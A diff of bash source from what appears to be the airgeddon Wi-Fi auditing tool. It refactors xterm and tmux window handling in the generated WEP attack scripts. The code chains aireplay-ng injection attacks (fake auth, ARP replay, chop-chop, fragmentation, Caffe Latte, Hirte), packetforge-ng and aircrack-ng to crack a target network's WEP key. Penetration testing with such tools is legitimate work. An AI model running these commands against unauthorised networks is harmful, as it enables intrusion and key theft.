@@ -2786,21 +2786,47 @@ function set_wep_key_script() {
 
 	cat >&8 <<-EOF
 		#!/usr/bin/env bash
+		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&8 <<-EOF
-			function start_tmux_processes() {
+	cat >&8 <<-EOF
 
-				command_line="\${1}"
-				window_name="\${2}"
+		function manage_output() {
 
-				tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
-				tmux new-window -t "${session_name}:" -n "\${window_name}"
-				tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
-			}
-		EOF
-	fi
+			xterm_parameters="\${1}"
+			tmux_command_line="\${2}"
+			xterm_command_line="\"\${2}\""
+			window_name="\${3}"
+			command_tail=" > /dev/null 2>&1 &"
+
+			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
+				"tmux")
+					local tmux_color
+					tmux_color=""
+					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
+					start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
+				;;
+				"xterm")
+					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
+				;;
+			esac
+		}
+		function start_tmux_processes() {
+
+			window_name="\${1}"
+			command_line="\${2}"
+			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
+			tmux new-window -t "${session_name}:" -n "\${window_name}"
+			local tmux_color_cmd
+			if [ -n "\${3}" ]; then
+				tmux_color_cmd="bg=#000000 fg=\${3}"
+			else
+				tmux_color_cmd="bg=#000000"
+			fi
+			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
+			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
+		}
+	EOF
 
 	cat >&8 <<-EOF
 		wep_key_found=0
@@ -2968,27 +2994,22 @@ function set_wep_key_script() {
 
 			window_position="${g5_topright_window}"
 			sleep 0.5
+			manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry \${window_position} -T \"WEP Key Decrypted\"" "clear;eval \"\${wep_key_cmd}\"" "WEP Key Decrypted"
+			#xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry "\${window_position}" -T "WEP Key Decrypted" -e "eval \"\${wep_key_cmd}\"" > /dev/null 2>&1 &
 	EOF
 
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&8 <<-'EOF'
-				xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry "${window_position}" -T "WEP Key Decrypted" -e "eval \"${wep_key_cmd}\"" > /dev/null 2>&1 &
-				wep_key_window_pid=$!
-				{
-				echo -e "${wep_key_window_pid}"
-		EOF
-	else
-		cat >&8 <<-'EOF'
-				start_tmux_processes "clear;eval \"${wep_key_cmd}\"" "WEP Key Decrypted"
-			fi
-		EOF
-	fi
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		cat >&8 <<-EOF
-				} >> "${tmpdir}${wepdir}${wep_processes_file}"
-			fi
+			wep_key_window_pid=\$!
+			{
+				echo -e "\${wep_key_window_pid}"
+			} >> "${tmpdir}${wepdir}${wep_processes_file}"
 		EOF
 	fi
+
+	cat >&8 <<-EOF
+		fi
+	EOF
 }
 
 #Create here-doc bash script used for wep all-in-one attack
@@ -3002,32 +3023,57 @@ function set_wep_script() {
 
 	cat >&6 <<-EOF
 		#!/usr/bin/env bash
+		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
 		global_process_pid=""
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-			function start_tmux_processes() {
+	cat >&6 <<-EOF
+		function manage_output() {
 
-				command_line="\${1}"
-				window_name="\${2}"
+			xterm_parameters="\${1}"
+			tmux_command_line="\${2}"
+			xterm_command_line="\"\${2}\""
+			window_name="\${3}"
+			command_tail=" > /dev/null 2>&1 &"
 
-				tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
-				tmux new-window -t "${session_name}:" -n "\${window_name}"
-				tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
-			}
-			function get_tmux_process_id() {
+			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
+				"tmux")
+					local tmux_color
+					tmux_color=""
+					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
+					start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
+				;;
+				"xterm")
+					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
+				;;
+			esac
+		}
+		function start_tmux_processes() {
 
-				local process_pid
-				local process_cmd_line
-				process_cmd_line=\$(echo "\${1}" | tr -d '"')
-				while [ -z "\${process_pid}" ]; do
-					process_pid=\$(ps --no-headers aux | grep "\${process_cmd_line}" | grep -v "grep \${process_cmd_line}" | awk '{print \$2}')
-				done
-				global_process_pid="\${process_pid}"
-			}
-		EOF
-	fi
+			window_name="\${1}"
+			command_line="\${2}"
+			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
+			tmux new-window -t "${session_name}:" -n "\${window_name}"
+			local tmux_color_cmd
+			if [ -n "\${3}" ]; then
+				tmux_color_cmd="bg=#000000 fg=\${3}"
+			else
+				tmux_color_cmd="bg=#000000"
+			fi
+			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
+			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
+		}
+		function get_tmux_process_id() {
+
+			local process_pid
+			local process_cmd_line
+			process_cmd_line=\$(echo "\${1}" | tr -d '"')
+			while [ -z "\${process_pid}" ]; do
+				process_pid=\$(ps --no-headers aux | grep "\${process_cmd_line}" | grep -v "grep \${process_cmd_line}" | awk '{print \$2}')
+			done
+			global_process_pid="\${process_pid}"
+		}
+	EOF
 
 	cat >&6 <<-EOF
 		#shellcheck disable=SC1037
@@ -3058,51 +3104,34 @@ function set_wep_script() {
 							wep_chopchop_launched=1
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-								start_tmux_processes "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" "Chop-Chop Attack (1/3)"
+	cat >&6 <<-EOF
+							manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (1/3)\"" "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" "Chop-Chop Attack (1/3)"
+							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 								get_tmux_process_id "aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface}"
 								wep_chopchop_phase1_pid="\${global_process_pid}"
 								global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-								xterm -bg "#000000" -fg "#8B4513" -geometry "${g5_left7}" -T "Chop-Chop Attack (1/3)" -e "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
+							else
 								wep_chopchop_phase1_pid=$!
-		EOF
-	fi
-
-	cat >&6 <<-'EOF'
-								wep_script_processes+=(${wep_chopchop_phase1_pid})
 							fi
-						fi
-					;;
-					2)
-		EOF
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-						start_tmux_processes "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
-		EOF
-	else
-		cat >&6 <<-EOF
-						xterm -bg "#000000" -fg "#8B4513" -geometry "${g5_left7}" -T "Chop-Chop Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
-						wep_chopchop_phase2_pid=$!
-						wep_script_processes+=(${wep_chopchop_phase2_pid})
-		EOF
-	fi
+	EOF
 
 	cat >&6 <<-'EOF'
+							wep_script_processes+=(${wep_chopchop_phase1_pid})
+						fi
+					fi
+				;;
+				2)
+	EOF
+
+	cat >&6 <<-EOF
+					manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
+					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+						wep_chopchop_phase2_pid=$!
+					fi
+	EOF
+
+	cat >&6 <<-'EOF'
+						wep_script_processes+=(${wep_chopchop_phase2_pid})
 						wep_chopchop_phase=3
 					;;
 					3)
@@ -3110,24 +3139,16 @@ function set_wep_script() {
 						if [ -z "${wep_chopchop_phase2_pid_alive}" ]; then
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-							start_tmux_processes "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
-							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
-							wep_script_processes+=("\${global_process_pid}")
-							global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-							xterm -hold -bg "#000000" -fg "#8B4513" -geometry "${g5_left7}" -T "Chop-Chop Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
-							wep_script_processes+=($!)
-		EOF
-	fi
+	cat >&6 <<-EOF
+							manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
+							if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
+								wep_script_processes+=("\${global_process_pid}")
+								global_process_pid=""
+							else
+								wep_script_processes+=($!)
+							fi
+	EOF
 
 	cat >&6 <<-'EOF'
 							wep_chopchop_phase=4
@@ -3160,24 +3181,16 @@ function set_wep_script() {
 							wep_fragmentation_launched=1
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-							start_tmux_processes "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" "Fragmentation Attack (1/3)"
-							get_tmux_process_id "aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}"
-							wep_fragmentation_phase1_pid="\${global_process_pid}"
-							global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-								xterm -bg "#000000" -fg "#0000FF" -geometry "${g5_left6}" -T "Fragmentation Attack (1/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
+	cat >&6 <<-EOF
+							manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (1/3)\"" "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" "Fragmentation Attack (1/3)"
+							if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}"
+								wep_fragmentation_phase1_pid="\${global_process_pid}"
+								global_process_pid=""
+							else
 								wep_fragmentation_phase1_pid=$!
-		EOF
-	fi
+							fi
+	EOF
 
 	cat >&6 <<-'EOF'
 							wep_script_processes+=(${wep_fragmentation_phase1_pid})
@@ -3187,50 +3200,32 @@ function set_wep_script() {
 				2)
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-							start_tmux_processes "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" "Fragmentation Attack (2/3)"
-		EOF
-	else
-		cat >&6 <<-EOF
-						xterm -bg "#000000" -fg "#0000FF" -geometry "${g5_left6}" -T "Fragmentation Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
-						wep_fragmentation_phase2_pid=$!
-						wep_script_processes+=(${wep_fragmentation_phase2_pid})
-		EOF
-	fi
+	cat >&6 <<-EOF
+						manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" "Fragmentation Attack (2/3)"
+						if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+							wep_fragmentation_phase2_pid=$!
+						fi
+	EOF
 
 	cat >&6 <<-'EOF'
 					wep_fragmentation_phase=3
+					wep_script_processes+=(${wep_fragmentation_phase2_pid})
 				;;
 				3)
 					wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fragmentation_phase2_pid}$" 2> /dev/null)
 					if [ -z "${wep_fragmentation_phase2_pid_alive}" ]; then
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-							start_tmux_processes "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" "Fragmentation Attack (3/3)"
+	cat >&6 <<-EOF
+						manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" "Fragmentation Attack (3/3)"
+						if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}"
 							wep_script_processes+=("\${global_process_pid}")
 							global_process_pid=""
-
-		EOF
-	else
-		cat >&6 <<-EOF
-							xterm -hold -bg "#000000" -fg "#0000FF" -geometry "${g5_left6}" -T "Fragmentation Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
+						else
 							wep_script_processes+=($!)
-		EOF
-	fi
+						fi
+	EOF
 
 	cat >&6 <<-'EOF'
 							wep_fragmentation_phase=4
@@ -3269,24 +3264,17 @@ function set_wep_script() {
 
 		wep_script_processes=()
 	EOF
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-			start_tmux_processes "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" "Capturing WEP Data"
+
+	cat >&6 <<-EOF
+		manage_output "-bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g5_topright_window} -T \"Capturing WEP Data\"" "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" "Capturing WEP Data"
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 			get_tmux_process_id "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}"
 			wep_script_capture_pid="\${global_process_pid}"
 			global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-			xterm -bg "#000000" -fg "#FFFFFF" -geometry "${g5_topright_window}" -T "Capturing WEP Data" -e "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
+		else
 			wep_script_capture_pid=$!
-		EOF
-	fi
+		fi
+	EOF
 
 	cat >&6 <<-'EOF'
 		wep_script_processes+=(${wep_script_capture_pid})
@@ -3312,24 +3300,16 @@ function set_wep_script() {
 			if [[ -n ${wep_capture_pid_alive} ]] && [[ -z ${wep_fakeauth_pid_alive} ]]; then
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-			start_tmux_processes "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
-			get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}"
-			wep_fakeauth_pid="\${global_process_pid}"
-			global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-			xterm -bg "#000000" -fg "#00FF00" -geometry "${g5_left1}" -T "Fake Auth" -e "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
-			wep_fakeauth_pid=$!
-		EOF
-	fi
+	cat >&6 <<-EOF
+				manage_output "-bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}"
+					wep_fakeauth_pid="\${global_process_pid}"
+					global_process_pid=""
+				else
+					wep_fakeauth_pid=$!
+				fi
+	EOF
 
 	cat >&6 <<-'EOF'
 				wep_script_processes+=(${wep_fakeauth_pid})
@@ -3341,81 +3321,49 @@ function set_wep_script() {
 				wep_to_be_launched_only_once=1
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-			start_tmux_processes "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" "Arp Broadcast Injection"
-			get_tmux_process_id "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}"
-			wep_script_processes+=("\${global_process_pid}")
-			global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-					xterm -hold -bg "#000000" -fg "#FFFF00" -geometry "${g5_left2}" -T "Arp Broadcast Injection" -e "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
+	cat >&6 <<-EOF
+				manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_left2} -T \"Arp Broadcast Injection\"" "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" "Arp Broadcast Injection"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
 					wep_script_processes+=($!)
-		EOF
-	fi
+				fi
+	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-			start_tmux_processes "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" "Arp Request Replay"
-			get_tmux_process_id "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}"
-			wep_script_processes+=("\${global_process_pid}")
-			global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-					xterm -hold -bg "#000000" -fg "#FF0000" -geometry "${g5_left3}" -T "Arp Request Replay" -e "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
+	cat >&6 <<-EOF
+				manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g5_left3} -T \"Arp Request Replay\"" "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" "Arp Request Replay"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
 					wep_script_processes+=($!)
-		EOF
-	fi
+				fi
+	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-			start_tmux_processes "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
-			get_tmux_process_id "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}"
-			wep_script_processes+=("\${global_process_pid}")
-			global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-					xterm -hold -bg "#000000" -fg "#FFC0CB" -geometry "${g5_left4}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
+	cat >&6 <<-EOF
+				manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g5_left4} -T \"Caffe Latte Attack\"" "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
 					wep_script_processes+=($!)
-		EOF
-	fi
+				fi
+	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-			start_tmux_processes "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Hirte Attack"
-			get_tmux_process_id "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}"
-			wep_script_processes+=("\${global_process_pid}")
-			global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-					xterm -hold -bg "#000000" -fg "#D3D3D3" -geometry "${g5_left5}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
+	cat >&6 <<-EOF
+				manage_output "-hold -bg \"#000000\" -fg \"#D3D3D3\" -geometry ${g5_left5} -T \"Hirte Attack\"" "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Hirte Attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
 					wep_script_processes+=($!)
-		EOF
-	fi
+				fi
+	EOF
 
 	cat >&6 <<-'EOF'
 				write_wep_processes
@@ -3442,24 +3390,16 @@ function set_wep_script() {
 				wep_aircrack_launched=1
 	EOF
 
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		cat >&6 <<-EOF
-			start_tmux_processes "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" "Decrypting WEP Key"
-			get_tmux_process_id "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\""
-			wep_aircrack_pid="\${global_process_pid}"
-			global_process_pid=""
-		EOF
-	else
-		cat >&6 <<-EOF
-					xterm -bg "#000000" -fg "#FFFF00" -geometry "${g5_bottomright_window}" -T "Decrypting WEP Key" -e "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" > /dev/null 2>&1 &
-		EOF
-	fi
-
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		cat >&6 <<-'EOF'
+	cat >&6 <<-EOF
+				manage_output "-bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_bottomright_window} -T \"Decrypting WEP Key\"" "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" "Decrypting WEP Key"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\""
+					wep_aircrack_pid="\${global_process_pid}"
+					global_process_pid=""
+				else
 					wep_aircrack_pid=$!
-		EOF
-	fi
+				fi
+	EOF
 
 	cat >&6 <<-'EOF'
 				wep_script_processes+=(${wep_aircrack_pid})
